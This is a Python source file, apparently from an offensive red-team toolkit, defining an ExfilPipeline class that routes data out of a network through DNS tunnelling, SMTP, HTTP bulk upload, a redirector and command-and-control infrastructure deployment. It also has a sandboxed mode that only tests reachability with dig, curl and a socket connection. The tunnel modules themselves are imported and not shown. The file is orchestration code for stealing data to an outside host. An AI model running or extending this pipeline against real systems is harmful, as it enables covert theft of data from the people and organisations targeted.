from __future__ import annotations
import asyncio, os, functools
from typing import TYPE_CHECKING, Optional
if TYPE_CHECKING:
    from ..runtime.session_manager import SandboxSession

from ..skills_bridge import SkillsBridge
from .dns_tunnel import DNSTunnel
from .smtp_tunnel import SMTPTunnel
from .bulk_exfil import BulkExfil
from .bounceback import BounceBack
from .redcloud import RedcloudDeploy


class ExfilPipeline:
    def __init__(self, dns_domain: str = None, dns_server: str = "8.8.8.8",
                 smtp_server: str = None, smtp_port: int = 25,
                 smtp_user: str = None, smtp_pass: str = None, smtp_tls: bool = False,
                 http_endpoint: str = None,
                 sandbox: Optional[SandboxSession] = None):
        self.skills = SkillsBridge()
        self.sandbox = sandbox
        self.dns_domain = dns_domain
        self.dns_server = dns_server
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.smtp_user = smtp_user
        self.smtp_pass = smtp_pass
        self.smtp_tls = smtp_tls
        self.http_endpoint = http_endpoint

    def _sandboxed_exec(self, cmd: list[str], timeout: int = 120) -> dict:
        if self.sandbox and self.sandbox.running:
            return self.sandbox.exec(cmd, timeout=timeout)
        return {"error": "no sandbox", "exit_code": -1}

    async def run(self, data: str, method: str = "dns", recipient: str = None,
                  forward_host: str = None, forward_port: int = 443,
                  redcloud_profile: str = "default",
                  use_skills: bool = True, use_sandbox: bool = False) -> dict:
        results = {"method": method, "components": {}, "skills_used": [], "sandboxed": False}

        sandbox_active = use_sandbox and self.sandbox and self.sandbox.running
        results["sandboxed"] = sandbox_active

        if use_skills and not sandbox_active:
            skill_result = await asyncio.to_thread(
                self.skills.execute_skill,
                "detecting-data-exfiltration-indicators",
                [data[:100]],
            )
            if skill_result and "error" not in skill_result:
                results["components"]["skill_assessment"] = skill_result
                results["skills_used"].append("detecting-data-exfiltration-indicators")

        if sandbox_active:
            if method == "dns" or method == "all":
                sb_dns = self._sandboxed_exec(
                    ["dig", "+short", "test.example.com"] if self.dns_domain
                    else ["python3", "-c", "print('no dns_domain')"],
                    timeout=30,
                )
                results["components"]["dns"] = {
                    "sandbox_result": sb_dns.get("stdout", "")[:2000],
                    "sandboxed": True,
                }
            if method == "http" or method == "all":
                if self.http_endpoint:
                    sb_http = self._sandboxed_exec(
                        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", self.http_endpoint],
                        timeout=30,
                    )
                    results["components"]["http"] = {
                        "sandbox_http_code": sb_http.get("stdout", ""),
                        "sandboxed": True,
                    }
                else:
                    results["components"]["http"] = {"error": "no http_endpoint specified", "sandboxed": True}
            if method == "redirector" or method == "all":
                sb_redirector = self._sandboxed_exec(
                    ["python3", "-c",
                     f"import socket; s=socket.socket(); s.settimeout(5); "
                     f"s.connect(('{forward_host or '127.0.0.1'}', {forward_port})); "
                     f"print('redirector reachable'); s.close()"],
                    timeout=30,
                )
                results["components"]["bounceback"] = {
                    "sandbox_result": sb_redirector.get("stdout", ""),
                    "sandboxed": True,
                }
            results["summary"] = {
                "dns_available": bool(self.dns_domain),
                "http_available": bool(self.http_endpoint),
                "sandboxed": True,
            }
        else:
            if method == "dns" or method == "all":
                if self.dns_domain:
                    tunnel = DNSTunnel(self.dns_domain, self.dns_server)
                    results["components"]["dns"] = await asyncio.to_thread(tunnel.exfil, data)
                else:
                    results["components"]["dns"] = {"error": "no dns_domain specified"}

            if method == "smtp" or method == "all":
                if self.smtp_server:
                    tunnel = SMTPTunnel(self.smtp_server, self.smtp_port,
                                        self.smtp_user, self.smtp_pass, self.smtp_tls)
                    rcpt = recipient or "exfil@localhost"
                    results["components"]["smtp"] = await asyncio.to_thread(tunnel.exfil, data, rcpt)
                else:
                    results["components"]["smtp"] = {"error": "no smtp_server specified"}

            if method == "http" or method == "all":
                if self.http_endpoint:
                    bulk = BulkExfil(self.http_endpoint)
                    results["components"]["http"] = await bulk.exfil(data)
                else:
                    results["components"]["http"] = {"error": "no http_endpoint specified"}

            if method == "redirector" or method == "all":
                bb = BounceBack()
                if forward_host:
                    results["components"]["bounceback"] = await asyncio.to_thread(
                        bb.deploy, listen_port=8443,
                        forward_host=forward_host, forward_port=forward_port,
                    )
                else:
                    results["components"]["bounceback"] = await asyncio.to_thread(bb.status)

            if method == "infra" or method == "all":
                rc = RedcloudDeploy()
                results["components"]["redcloud"] = await asyncio.to_thread(rc.deploy, profile=redcloud_profile)

            results["summary"] = {
                "dns_available": bool(self.dns_domain),
                "smtp_available": bool(self.smtp_server),
                "http_available": bool(self.http_endpoint),
                "bounceback_available": os.path.isdir("/tmp/BounceBack"),
                "redcloud_available": os.path.isdir("/tmp/Redcloud"),
                "skills_available": len(results["skills_used"]),
            }

        return results
